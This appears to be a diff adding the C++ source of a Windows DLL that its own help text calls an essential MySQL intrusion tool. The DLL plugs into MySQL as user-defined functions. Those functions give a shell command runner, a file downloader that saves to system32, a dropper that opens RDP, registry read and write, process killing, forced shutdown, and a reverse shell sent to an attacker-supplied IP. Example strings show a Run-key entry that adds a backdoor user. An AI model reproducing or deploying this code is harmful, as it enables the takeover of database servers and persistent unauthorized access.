@@ -1,0 +1,749 @@
+#include "stdafx.h"
+#include "stdio.h"
+#include <windows.h>
+#include <tlhelp32.h>
+#include <stdlib.h>
+#include <winsock.h>
+#include <Urlmon.h>
+#include "mysql.h"
+#include "resource.h"
+#include "mydebug.h"
+#pragma comment(lib, "Urlmon.lib")
+HANDLE g_module;
+//---------------------------------------------------------- ---------------------------
+BOOL APIENTRY DllMain(HINSTANCE hModule,DWORD ul_reason_for_call,LPVOID lpReserved)
+{
+  if(ul_reason_for_call==DLL_PROCESS_ATTACH)
+           g_module=hModule;
+  return TRUE;
+}
+//-------------------------------------------------------------------------------- -----------------------cmdshell
+extern "C" __declspec(dllexport)my_bool cmdshell_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
+{//return 1出错 ,0 正常
+     initid->max_length=65*1024*1024;
+     return 0;
+}
+extern "C" __declspec(dllexport)char *cmdshell(UDF_INIT *initid, UDF_ARGS *args,
+char *result, unsigned long *length,char *is_null, char *error)
+{
+ 
+     if(args->arg_count!=1 || args->arg_type[0]!=STRING_RESULT || stricmp(args->args[0],"help")==0)
+     {
+           initid->ptr=(char *)malloc(200);
+           if(initid->ptr==NULL)return NULL;
+           strcpy(initid->ptr,"执行CMD Shell函数.\r\n例:select cmdshell(\"dir c:\\\\\");\r\n参数中的\"\\\"要用\"\\\\\"代替.");
+           *length=strlen(initid->ptr);
+           return initid->ptr;
+     }
+ 
+     int RunStatus=0;
+     char *cmdline,TempFilePath[MAX_PATH],ShellPath[MAX_PATH],temp[100];
+     DWORD size=0,len;
+     HANDLE hFile;
+   
+     GetSystemDirectory(ShellPath,MAX_PATH-1);
+     strcat(ShellPath,"\\cmd.exe");
+     GetEnvironmentVariable("temp",TempFilePath,MAX_PATH-1);
+     strcat(TempFilePath,"\\2351213.tmp");
+ 
+     cmdline=(char *)malloc(strlen(args->args[0])+strlen(TempFilePath)+7);
+     strcpy(cmdline," /c ");
+     strcat(cmdline,(args->args)[0]);
+     strcat(cmdline,">");
+     strcat(cmdline,TempFilePath);
+ 
+     STARTUPINFO si;
+     PROCESS_INFORMATION pi;
+     ZeroMemory( &si, sizeof(si) );
+     si.wShowWindow=SW_HIDE;
+     si.cb = sizeof(si);
+     ZeroMemory( &pi, sizeof(pi) );
+     RunStatus=CreateProcess(ShellPath,cmdline,NULL,NULL,FALSE,0,0,0,&si,&pi);
+     free(cmdline);
+ 
+     if(!RunStatus)
+     {
+           itoa(GetLastError(),temp,10);
+           sprintf(temp,"Shell无法启动,GetLastError=%s\n",temp);
+           initid->ptr=(char *)malloc(strlen(temp)+1);
+           strcpy(initid->ptr,temp);
+           (*length)=strlen(initid->ptr);
+           return initid->ptr;
+     }
+ 
+     WaitForSingleObject(pi.hProcess,30000);
+ 
+     //获得结果
+     hFile=CreateFile(TempFilePath,GENERIC_READ,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,
+OPEN_EXISTING,FILE_ATTRIBUTE_ARCHIVE,NULL);
+     if(hFile!=INVALID_HANDLE_VALUE)
+     {
+           size=GetFileSize(hFile,NULL);
+           initid->ptr=(char *)malloc(size+100);
+           ReadFile(hFile,initid->ptr,size+1,&len,NULL);
+           (initid->ptr)[size]='\0'
+           strcat(initid->ptr,"\r\n--------------------------------------------完成!\r\n");
+ 
+           CloseHandle(hFile);
+           DeleteFile(TempFilePath);
+     }
+     else
+     {
+           initid->ptr=(char *)malloc(100);
+           strcpy(initid->ptr,"\r\n--------------------------------------------完成!\r\n");
+     }
+     (*length)=strlen(initid->ptr);
+     return initid->ptr;
+ 
+}
+extern "C" __declspec(dllexport)void cmdshell_deinit(UDF_INIT *initid)
+{
+     if(initid->ptr!=NULL)
+           free(initid->ptr);
+}
+//---------------------------------------------------------------------------------------------------------------------------downloader
+extern "C" __declspec(dllexport)my_bool downloader_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
+{//return 1出错 ,0 正常
+     initid->max_length=65*1024*1024;
+     return 0;
+}
+extern "C" __declspec(dllexport)char *downloader(UDF_INIT *initid, UDF_ARGS *args,char *result, unsigned long *length,char *is_null, char *error)
+{
+     if(args->arg_count!=2 || args->arg_type[0]!=STRING_RESULT || args->arg_type[1]!=STRING_RESULT || stricmp(args->args[0],"help")==0)
+     {
+           initid->ptr=(char *)malloc(200);
+           if(initid->ptr==NULL)return NULL;
+           strcpy(initid->ptr,"下载者函数\r\n例:select downloader(\"http://www.baidu.com/server.exe\",\"c:\\\\winnt\\\\system32\\\\ser.exe\");\r\n参数中的\"\\\"要用\"\\\\\"代替.");
+           *length=strlen(initid->ptr);
+           return initid->ptr;
+     }
+ 
+     HANDLE hFile;
+     char path[MAX_PATH];
+ 
+     strcpy(path,(args->args)[1]);
+   
+     hFile=CreateFile(path,GENERIC_WRITE,FILE_SHARE_READ, NULL,CREATE_ALWAYS,0,NULL);
+     if(hFile==INVALID_HANDLE_VALUE)
+     {
+           initid->ptr=(char *)malloc(100+strlen(path));
+           sprintf(initid->ptr,"文件创建失败,请确认目录存在且有写权限(%s).",path);
+           *length=strlen(initid->ptr);
+           return initid->ptr;
+     }
+     CloseHandle(hFile);
+     DeleteFile(path);
+   
+     if(URLDownloadToFile(NULL,(args->args)[0],path,0,0)==S_OK)
+     {
+           initid->ptr=(char *)malloc(50+strlen(path));
+           sprintf(initid->ptr,"下载文件成功(%s).",path);
+           *length=strlen(initid->ptr);
+           return initid->ptr;
+     }
+     else
+     {
+           initid->ptr=(char *)malloc(100+strlen((args->args)[0]));
+           sprintf(initid->ptr,"下载文件出现错误,可能是网络原因(%s).",(args->args)[0]);
+           *length=strlen(initid->ptr);
+           return initid->ptr;
+     }
+ 
+}
+extern "C" __declspec(dllexport)void downloader_deinit(UDF_INIT *initid)
+{
+     if(initid->ptr)
+           free(initid->ptr);
+}
+//--------------------------------------------------------------------------------------------------------------------------open3389
+extern "C" __declspec(dllexport)my_bool open3389_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
+{//return 1出错 ,0 正常
+     initid->max_length=65*1024*1024;
+     return 0;
+}
+extern "C" __declspec(dllexport)char *open3389(UDF_INIT *initid, UDF_ARGS *args,char *result, unsigned long *length,char *is_null, char *error)
+{
+     if(!(args->arg_count==0 ||(args->arg_count==1 && args->arg_type[0]==INT_RESULT)))
+     {
+           initid->ptr=(char *)malloc(200);
+           if(initid->ptr==NULL)return NULL;
+           strcpy(initid->ptr,"通用开3389终端服务.修改端口需重启后生效.\r\n例:select open3389([端口]);");
+           *length=strlen(initid->ptr);
+           return initid->ptr;
+     }
+ 
+     HRSRC hrsrc1;
+     HGLOBAL hglobal1;
+     HANDLE hFile;
+     char path[MAX_PATH];
+     DWORD size,size2;
+ 
+     GetEnvironmentVariable("temp",path,MAX_PATH-1);
+     strcat(path,"\\457391.exe");
+ 
+     hrsrc1=FindResource((HMODULE)g_module, MAKEINTRESOURCE(IDR_BIN1), "BIN");
+     if(hrsrc1==NULL)
+     {
+           initid->ptr=(char *)malloc(100);
+           strcpy(initid->ptr,"查找资源出错,open3389无法继续运行.");
+           *length=strlen(initid->ptr);
+           return initid->ptr;
+     }
+     size=SizeofResource((HMODULE)g_module, hrsrc1);
+     hglobal1=LoadResource((HMODULE)g_module, hrsrc1);
+     if(hglobal1==NULL)
+     {
+           initid->ptr=(char *)malloc(100);
+           strcpy(initid->ptr,"载入资源出错,open3389无法继续运行.");
+           *length=strlen(initid->ptr);
+           return initid->ptr;
+     }
+ 
+     hFile = CreateFile(path,GENERIC_WRITE,0, NULL,CREATE_ALWAYS,0,NULL);
+     if(hFile==INVALID_HANDLE_VALUE)
+     {
+           initid->ptr=(char *)malloc(100);
+           strcpy(initid->ptr,"创建临时文件出错,open3389无法继续运行.");
+           *length=strlen(initid->ptr);
+           return initid->ptr;
+     }
+     WriteFile(hFile,(LPVOID)LockResource(hglobal1),size+1,&size2,NULL);
+     CloseHandle(hFile);
+     GlobalFree(hglobal1);
+ 
+     STARTUPINFO si;
+     PROCESS_INFORMATION pi;
+     ZeroMemory( &si, sizeof(si) );
+     si.wShowWindow=SW_HIDE;
+     si.cb = sizeof(si);
+     ZeroMemory( &pi, sizeof(pi) );
+     bool RunStatus=CreateProcess(path,NULL,NULL,NULL,FALSE,0,0,0,&si,&pi);
+     if(!RunStatus)
+     {
+           DeleteFile(path);
+           initid->ptr=(char *)malloc(100);
+           strcpy(initid->ptr,"运行临时文件出错,您的权限可能不够.");
+           *length=strlen(initid->ptr);
+           return initid->ptr;
+     }
+     WaitForSingleObject(pi.hProcess,5000);
+     DeleteFile(path);
+     //改端口
+     if(args->arg_count!=0 && args->arg_type[0]==INT_RESULT)
+     {
+           HKEY key;
+           DWORD dwDisposition;
+           DWORD port=*((long long *) args->args[0]);
+ 
+           RegCreateKeyEx(HKEY_LOCAL_MACHINE ,"SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp",0,"",REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&key,&dwDisposition);
+           if(!RegSetValueEx(key,"PortNumber",0,REG_DWORD,(BYTE *)&port,sizeof(port)))
+           {
+                 RegCloseKey(key);
+                 RegCreateKeyEx(HKEY_LOCAL_MACHINE ,"SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp",0,"",REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,
+NULL,&key,&dwDisposition);
+                 if(!RegSetValueEx(key,"PortNumber",0,REG_DWORD,(BYTE *)&port,sizeof(port)))
+                 {
+                       RegCloseKey(key);
+                       initid->ptr=(char *)malloc(100);
+                       sprintf(initid->ptr,"成功开启3389终端服务....\r\n成功修改终端服务端口为%d,重启后生效,重启系统可利用WindowsExit函数.",port);
+                       *length=strlen(initid->ptr);
+                       return initid->ptr;
+                 }
+           }
+           RegCloseKey(key);
+           initid->ptr=(char *)malloc(100);
+           sprintf(initid->ptr,"成功开启3389终端服务....\r\n修改终端服务端口失败.");
+           *length=strlen(initid->ptr);
+           return initid->ptr;
+         
+     }
+     else
+     {
+           initid->ptr=(char *)malloc(100);
+           sprintf(initid->ptr,"成功开启3389终端服务.\r\n");
+           *length=strlen(initid->ptr);
+           return initid->ptr;
+     }
+}
+extern "C" __declspec(dllexport)void open3389_deinit(UDF_INIT *initid)
+{
+     if(initid->ptr)
+           free(initid->ptr);
+}
+//--------------------------------------------------------------------------------------------------------------------------regread
+extern "C" __declspec(dllexport)my_bool regread_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
+{//return 1出错 ,0 正常
+     initid->max_length=65*1024*1024;
+     return 0;
+}
+extern "C" __declspec(dllexport)char *regread(UDF_INIT *initid, UDF_ARGS *args,char *result, unsigned long *length,char *is_null, char *error)
+{
+     if(args->arg_count!=3 || args->arg_type[0]!=STRING_RESULT || args->arg_type[1]!=STRING_RESULT || args->arg_type[2]!=STRING_RESULT || stricmp(args->args[0],"help")==0)
+     {
+           initid->ptr=(char *)malloc(250);
+           if(initid->ptr==NULL)return NULL;
+           strcpy(initid->ptr,"读注册表函数.\r\n例:select regread(\"HKEY_LOCAL_MACHINE\",\"SYSTEM\\\\ControlSet001\\\\Services\\\\W3SVC\\\\Parameters\\\\Virtual Roots\",\"/\");\r\n参数中的\"\\\"要用\"\\\\\"代替.");
+           *length=strlen(initid->ptr);
+           return initid->ptr;
+     }
+ 
+     DWORD a,b,c;
+     BYTE bytere[1000];
+     HKEY key,key2;
+     if(strcmp("HKEY_LOCAL_MACHINE",(args->args)[0])==0)
+           key=HKEY_LOCAL_MACHINE;
+     else if(strcmp("HKEY_CLASSES_ROOT",(args->args)[0])==0)
+           key=HKEY_CLASSES_ROOT ;
+     else if(strcmp("HKEY_CURRENT_USER ",(args->args)[0])==0)
+           key=HKEY_CURRENT_USER ;
+     else if(strcmp("HKEY_USERS ",(args->args)[0])==0)
+           key=HKEY_USERS ;
+     else
+     {
+           initid->ptr=(char *)malloc(50+strlen((args->args)[0]));
+           sprintf(initid->ptr,"未知的注册表句柄:%s\r\n",(args->args)[0]);
+           *length=strlen(initid->ptr);
+           return initid->ptr;
+     }
+   
+ 
+     RegCreateKeyEx(key,(args->args)[1],0,0,REG_OPTION_NON_VOLATILE,KEY_QUERY_VALUE,NULL,&key2,&b);
+     if(b==REG_OPENED_EXISTING_KEY)
+     {
+           if(!RegQueryValueEx(key2,(args->args)[2],0,&a,bytere,&c))
+           {
+                 CloseHandle(key2);
+                 initid->ptr=(char *)malloc(1001);
+                 memset(initid->ptr,0,1001);
+                 strcpy(initid->ptr,(char *)bytere);
+                 *length=strlen(initid->ptr);
+                 return initid->ptr;
+           }
+           else
+           {
+                 CloseHandle(key2);
+                 initid->ptr=(char *)malloc(100);
+                 strcpy(initid->ptr,"找不注册表值\r\n");
+                 *length=strlen(initid->ptr);
+                 return initid->ptr;
+           }
+     }
+     else
+     {
+           CloseHandle(key2);
+           initid->ptr=(char *)malloc(100);
+           strcpy(initid->ptr,"找不注册表项\r\n");
+           *length=strlen(initid->ptr);
+           return initid->ptr;
+     }
+ 
+}
+extern "C" __declspec(dllexport)void regread_deinit(UDF_INIT *initid)
+{
+     if(initid->ptr)
+           free(initid->ptr);
+}
+//--------------------------------------------------------------------------------------------------------------------------regwrite
+extern "C" __declspec(dllexport)my_bool regwrite_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
+{//return 1出错 ,0 正常
+     initid->max_length=65*1024*1024;
+     return 0;
+}
+extern "C" __declspec(dllexport)char *regwrite(UDF_INIT *initid, UDF_ARGS *args,char *result, unsigned long *length,char *is_null, char *error)
+{
+     if(args->arg_count!=5 || args->arg_type[0]!=STRING_RESULT || args->arg_type[1]!=STRING_RESULT || args->arg_type[2]!=STRING_RESULT || args->arg_type[3]!=STRING_RESULT || args->arg_type[4]!=STRING_RESULT || stricmp(args->args[0],"help")==0)
+     {
+           initid->ptr=(char *)malloc(300);
+           if(initid->ptr==NULL)return NULL;
+           strcpy(initid->ptr,"写注册表函数.\r\n例:select regwrite(\"HKEY_LOCAL_MACHINE\",\"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion
+\\\\Run\",\"adduser\",\"REG_SZ\",\"cmd.exe /c net user langouster langouster /add\");\r\n参数中的\"\\\"要用\"\\\\\"代替.");
+           *length=strlen(initid->ptr);
+           return initid->ptr;
+     }
+ 
+     HKEY key,hkey;
+     DWORD dwDisposition,ktype;
+ 
+     if(strcmp("HKEY_LOCAL_MACHINE",(args->args)[0])==0)
+           hkey=HKEY_LOCAL_MACHINE;
+     else if(strcmp("HKEY_CLASSES_ROOT",(args->args)[0])==0)
+           hkey=HKEY_CLASSES_ROOT ;
+     else if(strcmp("HKEY_CURRENT_USER ",(args->args)[0])==0)
+           hkey=HKEY_CURRENT_USER ;
+     else if(strcmp("HKEY_USERS ",(args->args)[0])==0)
+           hkey=HKEY_USERS ;
+     else
+     {
+           initid->ptr=(char *)malloc(50+strlen((args->args)[0]));
+           sprintf(initid->ptr,"未知的注册表句柄:%s\r\n",(args->args)[0]);
+           *length=strlen(initid->ptr);
+           return initid->ptr;
+     }
+ 
+     if(strcmp("REG_BINARY",(args->args)[3])==0)
+           ktype=REG_BINARY;
+     else if(strcmp("REG_DWORD",(args->args)[3])==0)
+           ktype=REG_DWORD ;
+     else if(strcmp("REG_DWORD_LITTLE_ENDIAN",(args->args)[3])==0)
+           ktype=REG_DWORD_LITTLE_ENDIAN ;
+     else if(strcmp("REG_DWORD_BIG_ENDIAN",(args->args)[3])==0)
+           ktype=REG_DWORD_BIG_ENDIAN ;
+     else if(strcmp("REG_EXPAND_SZ",(args->args)[3])==0)
+           ktype=REG_EXPAND_SZ ;
+     else if(strcmp("REG_LINK",(args->args)[3])==0)
+           ktype=REG_LINK ;
+     else if(strcmp("REG_MULTI_SZ",(args->args)[3])==0)
+           ktype=REG_MULTI_SZ ;
+     else if(strcmp("REG_NONE",(args->args)[3])==0)
+           ktype=REG_NONE ;
+     else if(strcmp("REG_RESOURCE_LIST",(args->args)[3])==0)
+           ktype=REG_RESOURCE_LIST ;
+     else if(strcmp("REG_SZ",(args->args)[3])==0)
+           ktype=REG_SZ ;
+     else
+     {
+           initid->ptr=(char *)malloc(50+strlen((args->args)[3]));
+           sprintf(initid->ptr,"未知的注册表值类型:%s\r\n",(args->args)[3]);
+           *length=strlen(initid->ptr);
+           return initid->ptr;
+     }
+ 
+     RegCreateKeyEx(hkey,(args->args)[1],0,"",REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&key,&dwDisposition);
+     if(!RegSetValueEx(key,(args->args)[2],0,ktype,(BYTE *)(args->args)[4],lstrlen((args->args)[4])+1))
+     {
+           initid->ptr=(char *)malloc(100);
+           sprintf(initid->ptr,"写注册表成功\r\n");
+           *length=strlen(initid->ptr);
+           return initid->ptr;
+     }
+     else
+     {
+           initid->ptr=(char *)malloc(100);
+           sprintf(initid->ptr,"写注册表失败，可能是您的权限不够\r\n");
+           *length=strlen(initid->ptr);
+           return initid->ptr;
+     }
+     RegCloseKey(key);
+ 
+}
+extern "C" __declspec(dllexport)void regwrite_deinit(UDF_INIT *initid)
+{
+     if(initid->ptr)
+           free(initid->ptr);
+}
+//--------------------------------------------------------------------------------------------------------------------------KillProcess
+extern "C" __declspec(dllexport)my_bool KillProcess_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
+{//return 1出错 ,0 正常
+     initid->max_length=65*1024*1024;
+     return 0;
+}
+extern "C" __declspec(dllexport)char *KillProcess(UDF_INIT *initid, UDF_ARGS *args,char *result, unsigned long *length,char *is_null, char *error)
+{
+     if(args->arg_count!=1 || args->arg_type[0]!=STRING_RESULT || (strcmp((args->args)[0],"help")==0))
+     {
+           initid->ptr=(char *)malloc(200);
+           if(initid->ptr==NULL)return NULL;
+           strcpy(initid->ptr,"结束进程函数.\r\n例:select KillProcess(\"进程名 或 进程ID(十进制)\");\r\n程序目前还不能结束系统进程.");
+           *length=strlen(initid->ptr);
+           return initid->ptr;
+     }
+ 
+     HANDLE hSnapshot = NULL;
+     DWORD processid=0;
+     HANDLE hProcess;
+     char ProcessName[MAX_PATH],tempchar[10];
+     PROCESSENTRY32 pe;
+ 
+     strcpy(ProcessName,(args->args)[0]);
+     hSnapshot=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,NULL);
+     pe.dwSize = sizeof(PROCESSENTRY32);
+     Process32First(hSnapshot,&pe);
+     do
+     {
+           itoa(pe.th32ProcessID,tempchar,10);
+           if(stricmp(pe.szExeFile,ProcessName)==0 || stricmp(tempchar,ProcessName)==0)
+           {
+                 processid=pe.th32ProcessID;
+                 break;
+           }
+     }
+     while(Process32Next(hSnapshot,&pe)==TRUE);
+     CloseHandle(hSnapshot);
+ 
+     if(processid==0)
+     {
+           initid->ptr=(char *)malloc(100);
+           sprintf(initid->ptr,"找不到进程%s,请确认进程是否存在!",(args->args)[0]);
+           *length=strlen(initid->ptr);
+           return initid->ptr;
+     }
+     hProcess=OpenProcess(PROCESS_TERMINATE,false,processid);
+     if(TerminateProcess(hProcess,0))
+     {
+           CloseHandle(hProcess);
+           initid->ptr=(char *)malloc(100);
+           sprintf(initid->ptr,"%s进程成功终止.",(args->args)[0]);
+           *length=strlen(initid->ptr);
+           return initid->ptr;
+     }
+     else
+     {
+           CloseHandle(hProcess);
+           initid->ptr=(char *)malloc(100);
+           sprintf(initid->ptr,"%s进程终止失败,您的权限可能不足.",(args->args)[0]);
+           *length=strlen(initid->ptr);
+           return initid->ptr;
+ 
+     }
+}
+extern "C" __declspec(dllexport)void KillProcess_deinit(UDF_INIT *initid)
+{
+     if(initid->ptr)
+           free(initid->ptr);
+}
+//--------------------------------------------------------------------------------------------------------------------------ProcessView
+extern "C" __declspec(dllexport)my_bool ProcessView_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
+{//return 1出错 ,0 正常
+     initid->max_length=65*1024*1024;
+     return 0;
+}
+extern "C" __declspec(dllexport)char *ProcessView(UDF_INIT *initid, UDF_ARGS *args,char *result, unsigned long *length,char *is_null, char *error)
+{
+     if(args->arg_count!=0)
+     {
+           initid->ptr=(char *)malloc(100);
+           if(initid->ptr==NULL)return NULL;
+           strcpy(initid->ptr,"枚举进程函数.\r\n例:select ProcessView();");
+           *length=strlen(initid->ptr);
+           return initid->ptr;
+     }
+ 
+     HANDLE hSnapshot = NULL;
+     DWORD processid=0;
+     PROCESSENTRY32 pe;
+     char tempchar[10];
+ 
+     initid->ptr=(char *)malloc(2000);
+     if(initid->ptr==NULL)return NULL;
+     memset(initid->ptr,0,1000);
+ 
+     hSnapshot=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,NULL);
+     pe.dwSize = sizeof(PROCESSENTRY32);
+     Process32First(hSnapshot,&pe);
+     do
+     {
+           strcat(initid->ptr,pe.szExeFile);
+           strcat(initid->ptr,"\t");
+           itoa(pe.th32ProcessID,tempchar,10);
+           strcat(initid->ptr,tempchar);
+           strcat(initid->ptr,"\r\n");
+     }
+     while(Process32Next(hSnapshot,&pe)==TRUE);
+     CloseHandle(hSnapshot);
+     *length=strlen(initid->ptr);
+     return initid->ptr;
+ 
+}
+extern "C" __declspec(dllexport)void ProcessView_deinit(UDF_INIT *initid)
+{
+     if(initid->ptr!=NULL)
+           free(initid->ptr);
+}
+//--------------------------------------------------------------------------------------------------------------------------WindowsExit
+extern "C" __declspec(dllexport)my_bool WindowsExit_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
+{//return 1出错 ,0 正常
+     initid->max_length=65*1024*1024;
+     return 0;
+}
+extern "C" __declspec(dllexport)char *WindowsExit(UDF_INIT *initid, UDF_ARGS *args,char *result, unsigned long *length,char *is_null, char *error)
+{
+     if(args->arg_count!=1 || args->arg_type[0]!=STRING_RESULT || stricmp(args->args[0],"help")==0)
+     {
+           initid->ptr=(char *)malloc(100);
+           if(initid->ptr==NULL)return NULL;
+           strcpy(initid->ptr,"关机重启注销函数.\r\n例:select WindowsExit(\"logoff|shutdown|reboot\");");
+           *length=strlen(initid->ptr);
+           return initid->ptr;
+     }
+ 
+     HANDLE hToken;
+     TOKEN_PRIVILEGES token;
+     UINT Flag;
+     if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES,&hToken))
+     {
+           initid->ptr=(char *)malloc(100);
+           if(initid->ptr==NULL)return NULL;
+           strcpy(initid->ptr,"获得进程访问信令出错,您的权限可能不足.\r\n");
+           *length=strlen(initid->ptr);
+           return initid->ptr;
+     }
+     token.PrivilegeCount = 1;
+     LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &token.Privileges[0].Luid);
+     token.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
+     if(!AdjustTokenPrivileges(hToken,0,&token, sizeof(token),0,0))
+     {
+           initid->ptr=(char *)malloc(100);
+           if(initid->ptr==NULL)return NULL;
+           strcpy(initid->ptr,"获得关机令牌出错,您的权限可能不足.\r\n");
+           *length=strlen(initid->ptr);
+           return initid->ptr;
+     }
+     if(stricmp(args->args[0],"logoff")==0)
+           Flag=EWX_LOGOFF|EWX_FORCE;
+     else if(stricmp(args->args[0],"shutdown")==0)
+           Flag=EWX_SHUTDOWN|EWX_FORCE;
+     else if(stricmp(args->args[0],"reboot")==0)
+           Flag=EWX_REBOOT|EWX_FORCE;
+     else
+     {
+           initid->ptr=(char *)malloc(100+strlen(args->args[0]));
+           if(initid->ptr==NULL)return NULL;
+           sprintf(initid->ptr,"未知的参数%s,期望为logoff、shutdown、reboot中的一个.\r\n",args->args[0]);
+           *length=strlen(initid->ptr);
+           return initid->ptr;
+     }
+     if(ExitWindowsEx(Flag,0))
+     {
+           initid->ptr=(char *)malloc(100);
+           if(initid->ptr==NULL)return NULL;
+           sprintf(initid->ptr,"成功执行.\r\n");
+           *length=strlen(initid->ptr);
+           return initid->ptr;
+     }
+     else
+     {
+           initid->ptr=(char *)malloc(100);
+           if(initid->ptr==NULL)return NULL;
+           sprintf(initid->ptr,"执行失败,您的权限可能不足.\r\n");
+           *length=strlen(initid->ptr);
+           return initid->ptr;
+     }
+ 
+}
+extern "C" __declspec(dllexport)void WindowsExit_deinit(UDF_INIT *initid)
+{
+     if(initid->ptr!=NULL)
+           free(initid->ptr);
+}
+//--------------------------------------------------------------------------------------------------------------------------BackShell
+extern "C" __declspec(dllexport)my_bool BackShell_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
+{//return 1出错 ,0 正常
+     initid->max_length=65*1024*1024;
+     return 0;
+}
+extern "C" __declspec(dllexport)char *BackShell(UDF_INIT *initid, UDF_ARGS *args,char *result, unsigned long *length,char *is_null, char *error)
+{
+     if(args->arg_count!=2 || args->arg_type[0]!=STRING_RESULT || args->arg_type[1]!=INT_RESULT || stricmp(args->args[0],"help")==0)
+     {
+           initid->ptr=(char *)malloc(100);
+           if(initid->ptr==NULL)return NULL;
+           strcpy(initid->ptr,"反弹shell.\r\n例:select BackShell(\"your IP\",your port);");
+           *length=strlen(initid->ptr);
+           return initid->ptr;
+     }
+ 
+     HRSRC hrsrc1;
+     HGLOBAL hglobal1;
+     HANDLE hFile;
+     char path[MAX_PATH],cmd[400];
+     DWORD size,size2;
+ 
+     GetEnvironmentVariable("temp",path,MAX_PATH-1);
+     strcat(path,"\\347win.exe");
+ 
+     hrsrc1=FindResource((HMODULE)g_module, MAKEINTRESOURCE(IDR_BIN2), "BIN");
+     if(hrsrc1==NULL)
+     {
+           initid->ptr=(char *)malloc(100);
+           strcpy(initid->ptr,"查找资源出错,BackShell无法继续运行.");
+           *length=strlen(initid->ptr);
+           return initid->ptr;
+     }
+     size=SizeofResource((HMODULE)g_module, hrsrc1);
+     hglobal1=LoadResource((HMODULE)g_module, hrsrc1);
+     if(hglobal1==NULL)
+     {
+           initid->ptr=(char *)malloc(100);
+           strcpy(initid->ptr,"载入资源出错,BackShell无法继续运行.");
+           *length=strlen(initid->ptr);
+           return initid->ptr;
+     }
+ 
+     hFile = CreateFile(path,GENERIC_WRITE,0, NULL,CREATE_ALWAYS,0,NULL);
+     if(hFile==INVALID_HANDLE_VALUE)
+     {
+           initid->ptr=(char *)malloc(100);
+           strcpy(initid->ptr,"创建临时文件出错,BackShell无法继续运行.");
+           *length=strlen(initid->ptr);
+           return initid->ptr;
+     }
+     WriteFile(hFile,(LPVOID)LockResource(hglobal1),size+1,&size2,NULL);
+     CloseHandle(hFile);
+     GlobalFree(hglobal1);
+     strcpy(cmd,path);
+     GetSystemDirectory(path,MAX_PATH-1);
+     strcat(path,"\\cmd.exe");
+     sprintf(cmd,"%s -e %s %s %d",cmd,path,args->args[0],*((long long *) args->args[1]));
+     if(WinExec(cmd,SW_HIDE)>31)
+     {
+           initid->ptr=(char *)malloc(100);
+           strcpy(initid->ptr,"执行成功\r\n");
+           *length=strlen(initid->ptr);
+           return initid->ptr;
+     }
+     else
+     {
+           initid->ptr=(char *)malloc(100);
+           strcpy(initid->ptr,"执行失败\r\n");
+           *length=strlen(initid->ptr);
+           return initid->ptr;
+     }
+}
+extern "C" __declspec(dllexport)void BackShell_deinit(UDF_INIT *initid)
+{
+     if(initid->ptr!=NULL)
+           free(initid->ptr);
+}
+//--------------------------------------------------------------------------------------------------------------------------about
+extern "C" __declspec(dllexport)my_bool about_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
+{//return 1出错 ,0 正常
+     initid->max_length=65*1024*1024;
+     return 0;
+}
+extern "C" __declspec(dllexport)char *about(UDF_INIT *initid, UDF_ARGS *args,char *result, unsigned long *length,char *is_null, char *error)
+{
+     initid->ptr=(char *)malloc(2000);
+     if(initid->ptr==NULL)return NULL;
+     memset(initid->ptr,0,2000);
+     strcat(initid->ptr,"mysql 入侵必备dll   版本1.0.0.1\r\n\r\n");
+     strcat(initid->ptr,"程序经多次测试，不太可能会造成MYSQL假死.\r\n");
+     strcat(initid->ptr,"注意:要使用本dll你必须有对mysql的insert和delete权限以创建和删除函数。\r\n\r\n");
+     strcat(initid->ptr,"使用方法:\r\n");
+     strcat(initid->ptr,"创建函数:create function 函数名(区分大小写) returns string soname \"dll名\" (注意路径);\r\n");
+     strcat(initid->ptr,"删除函数:delete function 函数名;\r\n");
+     strcat(initid->ptr,"使用函数:select 函数名(参数列表);获取参数信息可使用select 函数名(\"help\");\r\n");
+     strcat(initid->ptr,"--------------------------------------------------------------------\r\n");
+     strcat(initid->ptr,"本dll包含的函数:\r\n");
+     strcat(initid->ptr,"cmdshell 执行cmd;\r\n");
+     strcat(initid->ptr,"downloader 下载者,到网上下载指定文件并保存到指定目录;\r\n");
+     strcat(initid->ptr,"open3389 通用开3389终端服务,可指定端口(不改端口无需重启);\r\n");
+     strcat(initid->ptr,"BackShell 反弹Shell;\r\n");
+     strcat(initid->ptr,"ProcessView 枚举系统进程;\r\n");
+     strcat(initid->ptr,"KillProcess 终止指定进程;\r\n");
+     strcat(initid->ptr,"regread 读注册表;\r\n");
+     strcat(initid->ptr,"regwrite 写注册表;\r\n");
+     strcat(initid->ptr,"WindowsExit 关机,注销,重启;\r\n");
+     strcat(initid->ptr,"about 本函数;\r\n");
+     strcat(initid->ptr,"--------------------------------------------------------------------\r\n");
+     strcat(initid->ptr,"使用过程中发现的bug可和我联系QQ:185826531(langouster)\r\n");
+     strcat(initid->ptr,"源程序公开,可以任意修改和添加功能,散布源程序请注明原作者.\r\n\r\n");
+     strcat(initid->ptr,"特别声明:并程序只供技术研究之用,不正当使用程序造成的后果作者概不负责!");
+     *length=strlen(initid->ptr);
+     return initid->ptr;
+ 
+}
+extern "C" __declspec(dllexport)void about_deinit(UDF_INIT *initid)
+{
+     if(initid->ptr!=NULL)
+           free(initid->ptr);
+}
